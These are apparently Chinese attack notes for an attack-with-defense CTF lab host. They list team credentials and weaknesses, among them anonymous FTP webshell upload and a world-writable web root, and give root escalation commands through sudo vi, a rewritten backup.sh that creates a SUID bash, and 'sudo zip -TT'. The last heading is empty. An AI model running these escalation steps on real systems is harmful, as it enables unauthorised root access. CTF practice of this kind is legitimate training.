# AWD 模式攻击

## 凭证信息 (Credentials)

### 默认配置使用 T1 的凭证 (密码不是加密后的 hash ，用 hash 做的密码)
-   **MySQL Root 用户:**
    ```
    T1: root:$1$0kRGbLi5$o1jTxIVwcDWSOcKtTLukM1
    T2: root:$1$xDRC88E9$NuBtIeH1q2Xndltvfk0Wu0
    ```
-   **Linux Root 用户:**
    ```
    T1: root:$1$DcI4hlB5$7Fzb9WR6XrBFwjHgBcpA61
    T2: root:$1$zu5fqmiV$hRUIt5Hp0LQwlBSDC5XuA0
    ```
-   **Linux welcome 用户:**
    ```
    T1: welcome:welcome
    T2: welcome:welcome
    ```
-   **WEB admin 用户:**
    ```
    T1: admin:babygirl94andrew10
    T2: admin:jeanjeandianacarolina
    ```
## FTP 服务

-   允许匿名登录。
-   可以访问服务器根目录 (`/`)。
-   允许上传文件。

## Web 目录权限 (`/var/www/html/`)

-   权限设置为 `777` (可读、可写、可执行)。
-   **利用方式:** 结合 FTP 匿名上传权限，可以直接上传 PHP Webshell (例如 `shell.php`) 到 Web 根目录，实现远程代码执行 (RCE)。

## Web robots.txt 文件
-   **提示信息:** 在 `robots.txt` 文件中可以找到以下内容：
    ```
    User-agent: *
    Disallow: /xxxxx
    ```
    之后你可以看到
    ```
    噢，防止我忘记密码，我把密码放在这里一份

    pw: xxxxxxxx
    ```
    xxxxxxxx 将是 admin 用户的密码

## `welcome` 用户密码复用

-   `welcome` 用户的 Linux 登录密码与其用户名相同，均为 `welcome`。
-   **提示信息:** 在 `/home/welcome/note.txt` 文件中可以找到以下内容：
    ```
    From root@localhost:

        朋友，你的密码太弱了，一旦知道你的用户名，不久知道密码了吗？

                        To welcome@localhost
    ```
    这暗示了 `welcome` 用户名和密码相同。

## Sudo 滥用
-   www-data 用户:
```bash
root@dmsy-awd:~# sudo -u www-data sudo -l
Matching Defaults entries for www-data on dmsy-awd:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User www-data may run the following commands on dmsy-awd:
    (welcome) NOPASSWD: /usr/bin/vi
```
    可以 !bash 提权

-   welcome 用户:
```bash
root@dmsy-awd:~# sudo -u welcome sudo -l
[sudo] password for welcome: 
Matching Defaults entries for welcome on dmsy-awd:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User welcome may run the following commands on dmsy-awd:
    (ALL) PASSWD: /home/*/backup.sh, /bin/zip
```
#### 提权路径
```bash
welcome@dmsy-awd:~$ mv backup.sh backup.sh.bak
welcome@dmsy-awd:~$ echo 'cp /bin/bash /tmp/bash;chmod +s /tmp/bash' > backup.sh
welcome@dmsy-awd:~$ chmod +x backup.sh
welcome@dmsy-awd:~$ ls -la /tmp/bash 
-rwsr-sr-x 1 root root 1168776 Apr 23 10:43 /tmp/bash
welcome@dmsy-awd:~$ /tmp/bash -p
bash-5.0# id
uid=1000(welcome) gid=1000(welcome) euid=0(root) egid=0(root) groups=0(root),1000(welcome)

welcome@dmsy-awd:~$ TF=$(mktemp -u)
welcome@dmsy-awd:~$ sudo zip $TF /etc/hosts -T -TT 'sh #'
  adding: etc/hosts (deflated 31%)
\# id
uid=0(root) gid=0(root) groups=0(root)
```

## SUID 提权
